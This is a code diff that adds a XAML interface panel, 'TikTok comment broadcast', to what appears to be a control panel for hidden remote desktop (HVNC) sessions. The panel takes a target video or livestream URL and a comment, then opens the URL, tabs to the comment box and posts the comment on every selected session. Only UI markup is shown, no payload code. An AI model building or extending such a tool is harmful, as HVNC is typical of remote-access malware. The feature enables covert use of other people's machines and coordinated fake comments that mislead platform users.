@@ -243,6 +243,37 @@
                         </StackPanel>
                     </Border>
 
+                    <!-- TikTok comment broadcast -->
+                    <Border Padding="12,10" CornerRadius="6" Margin="0,0,0,8"
+                            Background="#0A080F" BorderThickness="1" BorderBrush="#2A1840">
+                        <StackPanel>
+                            <TextBlock Text="♪  TIKTOK COMMENT BROADCAST" FontSize="9" FontWeight="Bold"
+                                       Foreground="#C0f38ba8" FontFamily="Consolas" Margin="0,0,0,8"/>
+                            <TextBlock Text="Target URL (video or live)" Style="{StaticResource SFieldLabel}"/>
+                            <TextBox x:Name="TxtTtTargetUrl" Style="{StaticResource STxt}" Height="28"
+                                     FontSize="11" Margin="0,0,0,8"
+                                     ToolTip="Full TikTok video or livestream URL"/>
+                            <TextBlock Text="Comment text" Style="{StaticResource SFieldLabel}"/>
+                            <TextBox x:Name="TxtTtBroadcastComment" Style="{StaticResource STxt}" Height="28"
+                                     FontSize="12" Margin="0,0,0,10"
+                                     ToolTip="Comment to post on all selected machines"/>
+                            <WrapPanel>
+                                <Button Content="1. Navigate" Height="28" Padding="12,0" Margin="0,0,6,6"
+                                        Style="{StaticResource SBtn}" FontSize="10"
+                                        Click="BtnTtCmt1_Click"
+                                        ToolTip="Open the target URL on all selected HVNC sessions"/>
+                                <Button Content="2. Focus chat" Height="28" Padding="12,0" Margin="0,0,6,6"
+                                        Style="{StaticResource SBtn}" FontSize="10"
+                                        Click="BtnTtCmt2_Click"
+                                        ToolTip="Press Tab×6 to reach the comment box"/>
+                                <Button Content="3. Type &amp; Submit" Height="28" Padding="12,0" Margin="0,0,0,6"
+                                        Style="{StaticResource SGreenBtn}" FontSize="10"
+                                        Click="BtnTtCmt3_Click"
+                                        ToolTip="Type the comment and press Enter"/>
+                            </WrapPanel>
+                        </StackPanel>
+                    </Border>
+
                     <!-- Log -->
                     <Border Padding="12,10" CornerRadius="6"
                             Background="#07FFFFFF" BorderThickness="1" BorderBrush="#18283040">
